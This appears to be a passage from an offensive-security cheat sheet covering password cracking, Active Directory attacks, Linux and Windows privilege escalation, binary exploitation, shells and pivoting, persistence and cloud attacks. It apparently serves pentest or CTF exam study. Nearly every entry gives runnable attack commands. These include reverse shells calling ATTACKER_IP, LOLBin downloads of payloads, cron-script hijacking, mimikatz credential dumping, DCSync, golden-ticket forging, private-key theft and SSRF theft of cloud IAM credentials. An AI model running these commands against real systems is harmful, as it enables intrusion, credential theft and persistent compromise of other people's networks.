- **How it works:** Systematic exhaustive guessing; effective against short passwords, slow against complex ones.
- **Goal:** Recover a password when no smarter attack applies.
- **Exploitation:**
  ```bash
  hydra -l admin -x 4:6:aA1 TARGET ssh          # 4-6 chars brute force
  hashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a      # mask attack
  ```
- **Tools:** `hydra`, `hashcat`, `john`

### Dictionary Attack
- **What it is:** Trying passwords from a wordlist (common passwords).
- **How it works:** Matches against lists like `rockyou.txt`; fast and often successful.
- **Goal:** Crack weak/common passwords quickly.
- **Exploitation:**
  ```bash
  hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
  john --wordlist=rockyou.txt hashes.txt
  ```
- **Tools:** `hashcat`, `john`, `hydra -P`

### Password Spraying
- **What it is:** Trying ONE password against MANY usernames (avoids account lockout).
- **How it works:** Low-and-slow — a single common password across the whole user list.
- **Goal:** Find weak passwords while avoiding lockout policies.
- **Exploitation:**
  ```bash
  netexec smb TARGET_IP -u users.txt -p 'Password123' --continue-on-success
  netexec smb TARGET_IP -u users.txt -p 'Spring2026!' 
  ```
- **Tools:** `netexec` (crackmapexec), `sprayhound`, `hydra`

### Credential Stuffing
- **What it is:** Reusing breached username/password pairs against other services.
- **How it works:** People reuse passwords; leaked combos are tried across multiple sites.
- **Goal:** Account takeover via password reuse.
- **Exploitation:**
  ```bash
  hydra -C leaked_creds.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid"
  ```
- **Tools:** `hydra -C`, `sentryMBA`, custom scripts

---

## 7. Active Directory Attacks

### Pass-the-Hash (PtH)
- **What it is:** Authenticating using an NTLM hash instead of the plaintext password.
- **How it works:** NTLM auth only needs the hash; the attacker reuses a dumped hash to authenticate to other services.
- **Goal:** Move laterally without cracking the password.
- **Exploitation:**
  ```bash
  # dump hashes first (see LSASS Dumping), then:
  impacket-psexec -hashes :NTLM_HASH DOMAIN/Administrator@TARGET_IP
  netexec smb TARGET_IP -u Administrator -H NTLM_HASH --exec-method smbexec
  ```
- **Tools:** `impacket-psexec`, `netexec`, `evil-winrm -H`

### Pass-the-Ticket (PtT)
- **What it is:** Reusing a captured Kerberos ticket (TGT/TGS) to authenticate.
- **How it works:** Tickets are cached in memory; the attacker injects a stolen ticket into their session and presents it.
- **Goal:** Impersonate a user/service without their password.
- **Exploitation:**
  ```powershell
  mimikatz # sekurlsa::tickets /export
  mimikatz # kerberos::ptt ticket.kirbi
  # then access resources as that user
  ```
  ```bash
  # Linux with Impacket
  impacket-ticketConverter ticket.kirbi ticket.ccache
  export KRB5CCNAME=ticket.ccache
  impacket-psexec -k -no-pass DOMAIN/user@TARGET_IP
  ```
- **Tools:** `mimikatz`, `Rubeus`, Impacket

### Kerberoasting
- **What it is:** Requesting service tickets (TGS) for SPNs and cracking them offline.
- **How it works:** Any domain user can request a TGS; it's encrypted with the service account's password hash — crack it offline.
- **Goal:** Recover service-account plaintext passwords.
- **Exploitation:**
  ```bash
  impacket-GetUserSPNs DOMAIN/user:password -dc-ip DC_IP -request
  # or with a hash:
  impacket-GetUserSPNs DOMAIN/user -hashes :HASH -dc-ip DC_IP -request
  # crack the captured TGS hash
  hashcat -m 13100 tgs.hash rockyou.txt
  ```
- **Tools:** `impacket-GetUserSPNs`, `Rubeus kerberoast`, `hashcat -m 13100`

### AS-REP Roasting
- **What it is:** Requesting an AS-REP for users with "Do not require Kerberos pre-authentication" enabled.
- **How it works:** For such accounts, the AS-REP is encrypted with the user's password hash and returned without knowing the password — crackable offline.
- **Goal:** Recover user passwords without any credentials.
- **Exploitation:**
  ```bash
  impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat
  hashcat -m 18200 asrep.hash rockyou.txt
  ```
- **Tools:** `impacket-GetNPUsers`, `Rubeus asreproast`, `hashcat -m 18200`

### Golden Ticket Attack
- **What it is:** Forging a TGT using the `krbtgt` account hash — unlimited domain access.
- **How it works:** The `krbtgt` hash signs all TGTs; with it, the attacker mints arbitrary, long-lived TGTs for any identity (even non-existent).
- **Goal:** Full, persistent domain compromise.
- **Exploitation:**
  ```powershell
  mimikatz # lsadump::dcsync /domain:DOMAIN /user:krbtgt
  mimikatz # kerberos::golden /user:fakeadmin /domain:DOMAIN /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt
  ```
  ```bash
  impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain DOMAIN fakeadmin
  export KRB5CCNAME=fakeadmin.ccache
  ```
- **Tools:** `mimikatz`, `impacket-ticketer`, `Rubeus`

### Silver Ticket Attack
- **What it is:** Forging a service ticket (TGS) for a specific service using its machine/account hash.
- **How it works:** The service ticket is encrypted with the service account's hash; with it, the attacker forges access to that one service.
- **Goal:** Targeted, stealthy access to a specific service (e.g., CIFS, HTTP).
- **Exploitation:**
  ```powershell
  mimikatz # kerberos::golden /user:admin /domain:DOMAIN /sid:SID /target:server.DOMAIN /service:cifs /rc4:SERVICE_HASH /ptt
  ```
- **Tools:** `mimikatz`, `impacket-ticketer -spn`

### Mimikatz Credential Dumping
- **What it is:** Extracting plaintext passwords, hashes, tickets, and PINs from Windows memory.
- **How it works:** Reads LSASS process memory and the SAM/SYSTEM registry to recover credentials.
- **Goal:** Harvest credentials for lateral movement and escalation.
- **Exploitation:**
  ```powershell
  mimikatz # privilege::debug
  mimikatz # sekurlsa::logonpasswords
  mimikatz # lsadump::sam
  mimikatz # lsadump::lsa /patch
  ```
- **Tools:** `mimikatz`

### LSASS Dumping
- **What it is:** Extracting the LSASS process memory to recover credentials offline.
- **How it works:** Dumps LSASS (Local Security Authority Subsystem Service) memory which holds cached credentials; parsed with Mimikatz/pypykatz.
- **Goal:** Obtain hashes/plaintext credentials.
- **Exploitation:**
  ```bash
  # on target (avoid direct mimikatz if EDR):
  procdump -ma lsass.exe lsass.dmp
  # offline parse
  pypykatz lsa minidump lsass.dmp
  ```
  ```powershell
  # PowerShell (in-memory)
  rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\lsass.dmp full
  ```
- **Tools:** `procdump`, `mimikatz`, `pypykatz`

### Internal Monologue Attack
- **What it is:** Extracting NTLM hashes without touching LSASS or invoking Mimikatz.
- **How it works:** Uses the NetNTLM challenge-response to compute the NTLM hash via a local named pipe, bypassing many EDRs.
- **Goal:** Stealthy credential (hash) extraction.
- **Exploitation:**
  ```powershell
  # Internal Monologue technique — SSI/NetNTLM over local named pipe
  # (specialized PoC; avoid direct LSASS access)
  ```
- **Tools:** Internal Monologue PoC, `Rubeus`

### DCSync
- **What it is:** Impersonating a Domain Controller to request password hashes via replication.
- **How it works:** An account with replication rights (Domain Admin, or `DS-Replication-Get-Changes`) pulls hashes from the DC as if doing normal replication.
- **Goal:** Dump every hash in the domain (including krbtgt).
- **Exploitation:**
  ```powershell
  mimikatz # lsadump::dcsync /domain:DOMAIN /all /csv
  ```
  ```bash
  impacket-secretsdump DOMAIN/user:password@DC_IP -just-dc
  ```
- **Tools:** `mimikatz`, `impacket-secretsdump`
## 8. Linux Privilege Escalation

### SUID/SGID Abuse
- **What it is:** Exploiting binaries with the SUID/SGID bit to run as owner (often root).
- **How it works:** A file with the SUID bit runs with the owner's privileges; if it's misconfigured (spawns a shell, edits files), it can escalate.
- **Goal:** Get a root shell via a misconfigured SUID binary.
- **Exploitation:**
  ```bash
  find / -perm -u=s -type f 2>/dev/null          # find SUID binaries
  find / -perm -4000 2>/dev/null
  # if /bin/bash is SUID:
  bash -p
  ```
- **Tools:** `find`, GTFOBins

### Sudo Misconfiguration
- **What it is:** Exploiting overly permissive `sudo` rights.
- **How it works:** `sudo -l` reveals commands the user can run as root; many are GTFOBins-exploitable (vim, less, find).
- **Goal:** Escape a sudo'd command to a root shell.
- **Exploitation:**
  ```bash
  sudo -l                                    # check rights
  sudo find . -exec /bin/sh \; -quit         # find GTFObin
  sudo vim -c ':!/bin/sh'
  sudo less /etc/passwd  →  !/bin/sh
  ```
- **Tools:** `sudo -l`, GTFOBins, `LinPEAS`

### Cron Job Abuse
- **What it is:** Exploiting a cron job that runs a writable script as root.
- **How it works:** If root's crontab runs a script the attacker can write to, they replace it with a reverse shell.
- **Goal:** Root shell via scheduled task hijack.
- **Exploitation:**
  ```bash
  cat /etc/crontab                            # inspect root cron
  # if a script is writable by you:
  echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /path/to/writable.sh
  ```
- **Tools:** `pspy`, manual, `LinPEAS`

### Writable Script Exploitation
- **What it is:** Overwriting a writable file/script that a privileged process executes.
- **How it works:** Identify root-owned files the user can modify; replace with malicious content.
- **Goal:** Escalate when a privileged process runs your payload.
- **Exploitation:**
  ```bash
  find / -writable -type f 2>/dev/null | grep -v proc
  # example: writable /etc/update-motd.d/ or systemd service ExecStart script
  ```
- **Tools:** `find`, `LinPEAS`, `pspy`

### Kernel Exploitation
- **What it is:** Exploiting a kernel vulnerability to gain root.
- **How it works:** A privilege-escalation CVE (Dirty COW, Dirty Pipe, etc.) is exploited via a public PoC.
- **Goal:** Direct root from an unprivileged user.
- **Exploitation:**
  ```bash
  uname -a                                    # get kernel version
  searchsploit linux kernel VERSION           # find PoC
  # compile and run the PoC
  ```
- **Tools:** `searchsploit`, `linux-exploit-suggester`

### Linux Capability Abuse
- **What it is:** Exploiting binaries granted Linux capabilities (e.g., `cap_setuid`).
- **How it works:** A binary with `cap_setuid+ep` can be abused to spawn a root shell.
- **Goal:** Escalate via capabilities instead of SUID.
- **Exploitation:**
  ```bash
  getcap -r / 2>/dev/null                    # find capabilities
  # if python3 has cap_setuid+ep:
  python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
  ```
- **Tools:** `getcap`, GTFOBins

### GTFOBins Exploitation
- **What it is:** A curated list of binaries that can be abused to escalate privileges or break out of restricted shells.
- **How it works:** Each entry documents the exact command to turn a legitimate binary into a shell/file-read/write primitive.
- **Goal:** Quick lookup of an escape for any available binary.
- **Exploitation:**
  ```bash
  # consult https://gtfobins.github.io for the binary you can run
  # e.g., awk:
  awk 'BEGIN {system("/bin/sh")}'
  ```
- **Tools:** GTFOBins (gtfobins.github.io), `LinPEAS`

### Docker Escape / Container Breakout
- **What it is:** Escaping a Docker container to the host.
- **How it works:** Privileged containers (`--privileged`), mounted Docker socket, or `cap_sys_admin` allow host access.
- **Goal:** Break out of the container to compromise the host.
- **Exploitation:**
  ```bash
  # if /var/run/docker.sock is mounted:
  docker run -it -v /:/host alpine chroot /host sh
  # privileged container:
  mount /dev/sda1 /mnt && chroot /mnt sh
  ```
- **Tools:** `docker`, `cdk`, `deepce`

### Dirty Pipe
- **What it is:** A Linux kernel vulnerability (CVE-2022-0847) allowing file overwrite for root escalation.
- **How it works:** Exploits pipe buffer flags to overwrite read-only files (e.g., `/etc/passwd`) or SUID binaries.
- **Goal:** Overwrite `/etc/passwd` or a SUID binary to get root.
- **Exploitation:**
  ```bash
  # use a DirtyPipe PoC to overwrite /etc/passwd with a root user
  ./dirtypipe /etc/passwd 1 ootz   # or overwrite a SUID binary
  ```
- **Tools:** DirtyPipe PoC (e.g., `CVE-2022-0847-DirtyPipe-Exploit`)

### Dirty COW
- **What it is:** A race-condition kernel vulnerability (CVE-2016-5195) granting write access to read-only files.
- **How it works:** A race in the memory subsystem lets an unprivileged process write to read-only mappings.
- **Goal:** Overwrite SUID binaries or `/etc/passwd` for root.
- **Exploitation:**
  ```bash
  gcc -pthread dirtycow.c -o dirtycow
  ./dirtycow /etc/passwd       # or a SUID binary
  ```
- **Tools:** Dirty COW PoC

### Polkit Exploitation
- **What it is:** Exploiting the `pkexec` privilege-escalation flaw (CVE-2021-4034, "PwnKit").
- **How it works:** `pkexec` is SUID root; a crafted argv triggers an out-of-bounds write granting root.
- **Goal:** Root from any unprivileged user.
- **Exploitation:**
  ```bash
  # PwnKit PoC
  python3 CVE-2021-4034.py     # or compile the C PoC
  ```
- **Tools:** PwnKit PoC

### Sudo Token Reuse
- **What it is:** Reusing a still-valid `sudo` timestamp (cached credentials) to escalate without a password.
- **How it works:** After a user runs `sudo`, the timestamp is cached; if the attacker controls the user (or sets the timestamp), they run sudo without a password.
- **Goal:** Run sudo commands without the password prompt.
- **Exploitation:**
  ```bash
  sudo -l                     # if cached, no password needed
  # or set the timestamp if you have a write primitive to /var/run/sudo
  ```
- **Tools:** manual, `sudo -v`

### Race Condition
- **What it is:** Exploiting a time-of-check/time-of-use (TOCTOU) gap to swap a file between validation and use.
- **How it works:** The attacker wins a race between a privileged process checking a file and using it, substituting a symlink/overwrite.
- **Goal:** Escalate privileges or corrupt data.
- **Exploitation:**
  ```bash
  # classic: symlink swap during a privileged file write
  while true; do ln -sf /tmp/fake /etc/target; ln -sf /etc/shadow /etc/target; done
  ```
- **Tools:** manual scripts, `razz`

### Symlink Attack
- **What it is:** Using symbolic links to make a privileged process read/write an unintended target.
- **How it works:** A privileged process follows a symlink the attacker controls, redirecting operations to sensitive files.
- **Goal:** Overwrite/read sensitive files via link redirection.
- **Exploitation:**
  ```bash
  ln -s /etc/passwd /tmp/controlled_target
  # privileged process writes to /tmp/controlled_target → overwrites /etc/passwd
  ```
- **Tools:** `ln -s`, manual

### OverlayFS Exploitation
- **What it is:** Exploiting OverlayFS kernel bugs (CVE-2021-3493, CVE-2023-0386) to gain root.
- **How it works:** A vulnerability in OverlayFS mount handling lets an unprivileged user mount and gain root capabilities.
- **Goal:** Root via filesystem bug.
- **Exploitation:**
  ```bash
  # use an OverlayFS PoC matching the kernel version
  ./exploit
  ```
- **Tools:** OverlayFS PoCs

---

## 9. Windows Privilege Escalation

### UAC Bypass
- **What it is:** Escalating from a standard/admin token to a high-integrity token, bypassing User Account Control.
- **How it works:** UAC's auto-elevate executables or COM objects are abused to silently elevate.
- **Goal:** Run code at high integrity without the UAC prompt.
- **Exploitation:**
  ```powershell
  # fodhelper / computerdefaults / sdclt UAC bypasses
  msfvenom -p windows/x64/exec CMD=calc.exe -f exe -o bypass.exe
  # use a UAC bypass script (e.g., FodhelperBypass.ps1)
  ```
- **Tools:** Metasploit `exploit/windows/local/bypassuac*`, `UACMe`

### Token Impersonation
- **What it is:** Impersonating a higher-privilege token (SYSTEM/Admin) held by another process.
- **How it works:** A process holding `SeImpersonatePrivilege` (services, IIS) can impersonate tokens; Potato family (JuicyPotato, PrintSpoofer, GodPotato) exploits this.
- **Goal:** Jump from service account to SYSTEM.
- **Exploitation:**
  ```powershell
  # PrintSpoofer
  .\PrintSpoofer.exe -c "cmd /c whoami" -i
  # GodPotato
  .\GodPotato.exe -cmd "cmd /c whoami"
  ```
- **Tools:** `PrintSpoofer`, `GodPotato`, `JuicyPotato`, `SweetPotato`

### Windows Service Abuse
- **What it is:** Exploiting misconfigured services (writable binaries, weak permissions).
- **How it works:** A service running as SYSTEM whose binary/path is writable by the user can be replaced with a payload.
- **Goal:** Replace a service binary to get SYSTEM.
- **Exploitation:**
  ```bash
  # enumerate
  accesschk.exe /accepteula -uwcqv "Authenticated Users" *
  # or with PowerShell
  Get-CimInstance win32_service | Where-Object {$_.StartName -eq "LocalSystem"}
  # if a service binary is writable, replace it and restart
  ```
- **Tools:** `accesschk`, `PowerUp`, `WinPEAS`

### Unquoted Service Path
- **What it is:** A service whose binary path contains spaces but isn't quoted.
- **How it works:** Windows resolves the path ambiguously, executing the first matching file (e.g., `C:\Program Files\Vuln Service.exe` → tries `C:\Program.exe`, `C:\Program Files\Vuln.exe`).
- **Goal:** Place a malicious exe at the ambiguous path to run as SYSTEM.
- **Exploitation:**
  ```powershell
  wmic service get name,pathname,startmode | findstr /i "auto"
  # if path is "C:\Program Files\Vuln Service.exe" and "C:\Program Files" is writable:
  copy payload.exe "C:\Program Files\Vuln.exe"
  sc stop VulnSvc & sc start VulnSvc
  ```
- **Tools:** `wmic`, `PowerUp`, `WinPEAS`

### AlwaysInstallElevated
- **What it is:** A registry setting that makes MSI installers run with SYSTEM privileges.
- **How it works:** Both HKLM and HKCU `AlwaysInstallElevated=1` let a standard user install an MSI as SYSTEM.
- **Goal:** Install a malicious MSI to get SYSTEM.
- **Exploitation:**
  ```bash
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  msfvenom -p windows/exec CMD="net user hacker pass /add" -f msi -o p.msi
  msiexec /quiet /qn /i p.msi
  ```
- **Tools:** `msfvenom -f msi`, `msiexec`

### DLL Hijacking
- **What it is:** Placing a malicious DLL in a location where a privileged process will load it.
- **How it works:** Windows DLL search order is abused; if a process looks for a missing DLL in a writable folder, the attacker supplies a malicious one.
- **Goal:** Code execution in a privileged process.
- **Exploitation:**
  ```bash
  # find missing DLLs with ProcMon, then:
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o hijack.dll
  # place it in the writable directory the target loads from
  ```
- **Tools:** `ProcMon`, `msfvenom`, `PowerSploit`

### Process Injection
- **What it is:** Injecting code into a running process to execute under its privileges.
- **How it works:** Uses Win32 APIs (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread) to run shellcode in a target process.
- **Goal:** Execute code as another (often privileged) process.
- **Exploitation:**
  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f ps1
  # or use Meterpreter: post/windows/manage/migrate
  ```
- **Tools:** Metasploit, `Cobalt Strike`, `mavinject`

### Registry Run Key Persistence
- **What it is:** Adding a Run key so a payload executes at user logon.
- **How it works:** `HKCU\...\Run` / `HKLM\...\Run` entries auto-start programs on login.
- **Goal:** Persistent access across reboots.
- **Exploitation:**
  ```powershell
  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v updater /t REG_SZ /d "C:\temp\payload.exe"
  ```
- **Tools:** `reg`, Metasploit `persistence`/`registry_persistence`

### Scheduled Task Abuse
- **What it is:** Creating a scheduled task to run a payload as SYSTEM or on a schedule.
- **How it works:** `schtasks` creates tasks with configurable triggers and run-as accounts.
- **Goal:** Persistence or privilege escalation.
- **Exploitation:**
  ```bash
  schtasks /create /tn "Update" /tr "C:\temp\payload.exe" /sc ONLOGON /ru SYSTEM
  schtasks /run /tn "Update"
  ```
- **Tools:** `schtasks`, `SharPersist`

### WMI Persistence
- **What it is:** Using WMI event subscriptions to execute code when a condition is met.
- **How it works:** A permanent event consumer binds a WMI filter (e.g., process start) to a command/script.
- **Goal:** Fileless persistence.
- **Exploitation:**
  ```powershell
  # use SharPersist or WMI-Persistence scripts
  # Create __EventFilter + CommandLineEventConsumer + __FilterToConsumerBinding
  ```
- **Tools:** `SharPersist`, `WMImplant`, PowerShell

### Living-off-the-Land Binaries (LOLBins)
- **What it is:** Abusing legitimate Windows binaries for malicious purposes.
- **How it works:** Signed system binaries (certutil, mshta, rundll32, bitsadmin, wmic) are used to download/execute payloads, evading detection.
- **Goal:** Blend in with normal activity and bypass application whitelisting.
- **Exploitation:**
  ```powershell
  certutil -urlcache -split -f http://ATTACKER_IP/payload.exe payload.exe
  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://ATTACKER_IP/shell.sct")
  bitsadmin /transfer n http://ATTACKER_IP/payload.exe C:\temp\payload.exe
  ```
- **Tools:** `LOLBAS-project`, `certutil`, `mshta`, `rundll32`
## 10. Binary Exploitation

### Buffer Overflow
- **What it is:** Writing more data to a buffer than it can hold, corrupting adjacent memory.
- **How it works:** Unbounded copy (`strcpy`, `gets`) overflows the buffer into the return address; the attacker controls EIP/RIP.
- **Goal:** Redirect execution to attacker-controlled shellcode.
- **Exploitation:**
  ```python
  # overflow payload = padding + EIP + shellcode
  payload = b"A" * offset + p32(eip_addr) + shellcode
  ```
- **Tools:** `gdb`, `peda`/`pwndbg`, `pwntools`

### Stack-based Buffer Overflow
- **What it is:** A buffer overflow on the stack that overwrites the saved return address.
- **How it works:** Local variables live on the stack; overflowing one overwrites the saved EIP just above it.
- **Goal:** Control the instruction pointer to jump to shellcode.
- **Exploitation:**
  ```python
  from pwn import *
  p = process('./vuln')
  payload = b"A"*64 + p32(0xdeadbeef)   # 64 = buffer size
  p.sendline(payload)
  ```
- **Tools:** `pwntools`, `gdb`

### Heap Overflow
- **What it is:** A buffer overflow in heap-allocated memory corrupting heap metadata.
- **How it works:** Overflowing a `malloc`'d buffer corrupts adjacent chunks/pointers, enabling arbitrary writes.
- **Goal:** Control function pointers or achieve arbitrary write.
- **Exploitation:**
  ```python
  # house of force, unlink, or tcache poisoning
  payload = b"A"*size + p64(target_addr)
  ```
- **Tools:** `pwntools`, `gdb`

### Return-to-libc
- **What it is:** Redirecting execution to a libc function (`system`) instead of shellcode.
- **How it works:** When NX/DEP blocks shellcode, the return address is set to `system()` with `/bin/sh` as an argument.
- **Goal:** Spawn a shell by calling existing library code.
- **Exploitation:**
  ```python
  payload = b"A"*offset + p32(system_addr) + p32(ret) + p32(binsh_addr)
  ```
- **Tools:** `pwntools`, `gdb`

### ROP (Return-Oriented Programming)
- **What it is:** Chaining short instruction sequences ("gadgets") ending in `ret` to perform arbitrary operations.
- **How it works:** When you can't run shellcode, you reuse existing code fragments to build a chain that calls `execve`/`system`.
- **Goal:** Bypass NX/DEP and ASLR to get a shell.
- **Exploitation:**
  ```bash
  ROPgadget --binary vuln --only "pop|ret"
  ropper --file vuln --search "pop rdi"
  ```
- **Tools:** `ROPgadget`, `ropper`, `pwntools`

### Format String Vulnerability
- **What it is:** Unsafe `printf(user_input)` allows reading/writing arbitrary memory.
- **How it works:** Format specifiers (`%x`, `%n`) interpret the stack, letting the attacker leak addresses or write values.
- **Goal:** Leak memory, overwrite GOT entries to redirect execution.
- **Exploitation:**
  ```
  %x %x %x %x          # leak stack
  %n                   # write to a pointer
  ```
  ```python
  payload = fmtstr_payload(offset, {got_addr: system_addr})
  ```
- **Tools:** `pwntools` `fmtstr_payload`, `gdb`

---

## 11. Shells, Lateral Movement & Pivoting

### Reverse Shell
- **What it is:** The target connects back to the attacker's listener, providing a shell.
- **How it works:** The payload initiates an outbound connection (bypassing inbound firewall rules).
- **Goal:** Obtain an interactive shell on the target.
- **Exploitation:**
  ```bash
  # listener
  nc -lvnp 4444
  # payloads:
  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell
  ```
- **Tools:** `nc`, `msfvenom`, `rlwrap`

### Bind Shell
- **What it is:** The target opens a listening port that the attacker connects to.
- **How it works:** The payload binds a shell to a local port; the attacker connects inbound.
- **Goal:** Shell access (useful when outbound is blocked but inbound is allowed).
- **Exploitation:**
  ```bash
  # on target:
  nc -lvnp 4444 -e /bin/sh
  # attacker:
  nc TARGET_IP 4444
  ```
- **Tools:** `nc`, `msfvenom` (bind payloads)

### Lateral Movement
- **What it is:** Moving from one compromised host to another within the network.
- **How it works:** Reusing credentials/hashes/tickets to authenticate to neighboring systems.
- **Goal:** Spread access toward the objective (Domain Admin, sensitive data).
- **Exploitation:**
  ```bash
  impacket-psexec DOMAIN/user:password@TARGET2
  impacket-wmiexec DOMAIN/user:password@TARGET2
  impacket-smbexec DOMAIN/user:password@TARGET2
  evil-winrm -i TARGET2 -u user -p password
  ```
- **Tools:** `impacket-psexec/wmiexec/smbexec`, `evil-winrm`, `netexec`

### Pivoting
- **What it is:** Routing traffic through a compromised host to reach otherwise-unreachable subnets.
- **How it works:** The attacker tunnels traffic through the foothold into internal networks.
- **Goal:** Access internal-only targets via the compromised machine.
- **Exploitation:**
  ```bash
  # Meterpreter
  run autoroute -s INTERNAL_SUBNET
  # Chisel
  ./chisel server -p 8000 --reverse
  # on target: ./chisel client ATTACKER_IP:8000 R:socks
  # then proxychains
  proxychains nmap -sT -Pn INTERNAL_IP
  ```
- **Tools:** `chisel`, `ligolo-ng`, `proxychains`, Meterpreter autoroute

### Tunneling
- **What it is:** Encapsulating one protocol inside another to traverse restricted networks.
- **How it works:** SSH/SOCKS/HTTP tunnels carry arbitrary traffic through a single allowed channel.
- **Goal:** Bypass network restrictions and move data/commands covertly.
- **Exploitation:**
  ```bash
  ssh -D 1080 user@TARGET        # SOCKS dynamic proxy
  ssh -L 8080:INTERNAL_IP:80 user@TARGET   # local forward
  ssh -R 8080:localhost:80 user@ATTACKER   # remote forward
  ```
- **Tools:** `ssh`, `chisel`, `stunnel`

### Port Forwarding
- **What it is:** Redirecting a port from one host to another.
- **How it works:** A listener forwards connections to a target (local or remote) via a relay.
- **Goal:** Expose an internal service to the attacker.
- **Exploitation:**
  ```bash
  ssh -L 8888:10.10.10.5:445 user@jumphost    # local forward
  socat TCP-LISTEN:8888,fork TCP:10.10.10.5:445
  ```
- **Tools:** `ssh -L/-R`, `socat`, `netsh interface portproxy`, `plink`

---

## 12. Persistence & Post-Exploitation

### Post-Exploitation Persistence
- **What it is:** Maintaining access to a compromised system over reboots/logouts.
- **How it works:** Installing backdoors, scheduled tasks, SSH keys, or implants that re-establish access.
- **Goal:** Ensure continued access for the engagement.
- **Exploitation:**
  ```bash
  # cron reverse shell, SSH authorized_keys, run keys, services
  ```
- **Tools:** Metasploit `persistence`, `SharPersist`, cron/SSH keys

### SSH Key Abuse
- **What it is:** Using stolen/added SSH private keys or `authorized_keys` to access systems.
- **How it works:** A leaked private key grants auth; or the attacker appends their public key to `authorized_keys`.
- **Goal:** Passwordless, persistent SSH access.
- **Exploitation:**
  ```bash
  ssh -i stolen_key.pem user@TARGET
  # or add your key:
  echo "ssh-rsa AAAA... " >> ~/.ssh/authorized_keys
  ```
- **Tools:** `ssh`, `ssh-keygen`

### Private Key Exfiltration
- **What it is:** Stealing SSH/TLS private keys from a compromised host.
- **How it works:** Reading `~/.ssh/id_rsa`, `id_ed25519`, or application keys.
- **Goal:** Reuse the key to access other systems.
- **Exploitation:**
  ```bash
  cat ~/.ssh/id_rsa       # copy to attacker, chmod 600, use
  find / -name "*.pem" -o -name "id_rsa" 2>/dev/null
  ```
- **Tools:** `find`, `cat`

### Weak SSH Configuration
- **What it is:** Exploiting permissive SSH settings (root login, password auth, old algorithms).
- **How it works:** Misconfigurations allow brute-force, weak ciphers, or root login.
- **Goal:** Easier remote access.
- **Exploitation:**
  ```bash
  ssh root@TARGET          # if PermitRootLogin yes
  hydra -l root -P rockyou.txt TARGET ssh
  ```
- **Tools:** `hydra`, `ssh`

### Misconfigured Services
- **What it is:** Services with insecure defaults (anonymous access, no auth, writable shares).
- **How it works:** FTP anonymous, SMB guest, NFS `no_root_squash`, Redis/Elasticsearch no-auth.
- **Goal:** Extract data or gain code execution.
- **Exploitation:**
  ```bash
  nmap --script smb-enum-shares,ftp-anon -p 21,445 TARGET
  smbclient //TARGET/share -U ''      # anonymous
  showmount -e TARGET                  # NFS shares
  ```
- **Tools:** `nmap` NSE, `smbclient`, `showmount`

### Exploit Chaining
- **What it is:** Combining multiple vulnerabilities/techniques to achieve a larger objective.
- **How it works:** Each link (e.g., XSS → credential theft → PtH → DCSync) builds on the last.
- **Goal:** Full compromise where no single vuln suffices.
- **Exploitation:** Documented in `16-CTF-AND-EXAM-SCENARIOS.md`.

---

## 13. Cloud Attacks

### Cloud Metadata SSRF
- **What it is:** Using SSRF to reach the cloud instance metadata service (169.254.169.254) and steal IAM credentials.
- **How it works:** The metadata endpoint returns temporary credentials for the instance's IAM role.
- **Goal:** Exfiltrate cloud credentials and assume the role.
- **Exploitation:**
  ```
  http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
  http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
  ```
  ```bash
  # then use stolen creds
  aws configure
  aws sts get-caller-identity
  ```
- **Tools:** Burp, `aws` CLI

### IAM Privilege Escalation
- **What it is:** Escalating cloud permissions by abusing overly permissive IAM policies.
- **How it works:** A role with `iam:PassRole`, `iam:CreatePolicyVersion`, or `sts:AssumeRole` can create/assume a more privileged role.
- **Goal:** Elevate from a limited role to full admin.
- **Exploitation:**
  ```bash
  # enumerate permissions
  aws iam list-attached-user-policies --user-name USER
  # abuse PassRole / AssumeRole to jump to an admin role
  aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/AdminRole --role-session-name pwn
  ```
- **Tools:** `aws` CLI, `ScoutSuite`, `Pacu`

### S3 Bucket Misconfiguration
- **What it is:** Publicly readable/writable S3 buckets leaking data or allowing takeover.
- **How it works:** Buckets with `public-read`/`public-write` or weak policies expose objects or accept malicious uploads.
- **Goal:** Read sensitive data, or plant files (subdomain takeover).
- **Exploitation:**
  ```bash
  aws s3 ls s3://bucket-name --no-sign-request
  aws s3 cp evil.html s3://bucket-name/index.html --no-sign-request
  ```
- **Tools:** `aws` CLI, `s3scanner`

### Misconfigured Security Groups
- **What it is:** Overly open cloud firewall rules (0.0.0.0/0 to sensitive ports).
- **How it works:** Security groups/NACLs that allow the world into RDP/SSH/DB ports.
- **Goal:** Direct access to exposed services.
- **Exploitation:**
  ```bash
  aws ec2 describe-security-groups --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]]'
  ```
- **Tools:** `aws` CLI, `ScoutSuite`, `Prowler`





